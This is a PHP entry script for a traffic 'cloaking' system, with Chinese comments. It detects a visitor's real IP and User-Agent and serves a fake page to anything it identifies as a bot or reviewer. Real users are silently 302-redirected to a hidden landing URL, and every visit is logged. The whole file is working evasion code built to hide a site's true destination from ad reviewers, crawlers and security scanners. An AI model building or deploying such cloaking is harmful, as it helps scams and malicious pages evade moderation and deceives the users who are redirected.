<?php
/**
 * Cloak 系统主入口文件
 * 负责流量检测、黑名单过滤和跳转逻辑
 * 
 * 功能：
 * 1. 获取访客真实IP地址（支持CDN环境）
 * 2. 检查IP和User-Agent是否在黑名单中
 * 3. 记录访问日志
 * 4. 根据检测结果显示假页面或跳转到真实地址
 */

// 引入核心模块
require_once 'Cloak_Core/Autoloader.php';

use Cloak\Core\Config;
use Cloak\Core\IPDetector;
use Cloak\Core\BlacklistChecker;
use Cloak\Core\Logger;

try {
    // 初始化配置
    $config = Config::getInstance();
    $config->ensureDataDirectory();
    
    // 获取访客真实IP
    $ipDetector = new IPDetector();
    $ip = $ipDetector->getRealIP();
    
    // 获取User-Agent和来源
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $referer = $_SERVER['HTTP_REFERER'] ?? '-';
    
    // 初始化日志记录器
    $logger = new Logger();
    
    // 黑名单检查
    $blacklistChecker = new BlacklistChecker();
    $isBot = $blacklistChecker->isBot($userAgent, $ip);
    
    if ($isBot) {
        // 机器人或恶意访问 - 显示假页面
        $logger->log($ip, $userAgent, '显示假页面 (机器人检测)', $referer);

        // 直接包含外部设置的假页面
        include 'fake_page.html';
        exit;
    }
    
    // 真实用户 - 跳转到目标地址
    $realUrl = $config->getLandingURL();
    
    // 验证跳转地址 - 如果为空则直接退出
    if (empty($realUrl)) {
        $logger->log($ip, $userAgent, '跳转地址未设置', $referer);
        exit;
    }
    
    // 记录正常跳转日志
    $logger->log($ip, $userAgent, '正常跳转', $referer);
    
    // 执行跳转
    header("Location: $realUrl", true, 302);
    exit;
    
} catch (Exception $e) {
    // 错误处理
    error_log("Cloak系统错误: " . $e->getMessage());
    
    // 显示通用错误页面
    http_response_code(500);

    exit;
}
?>
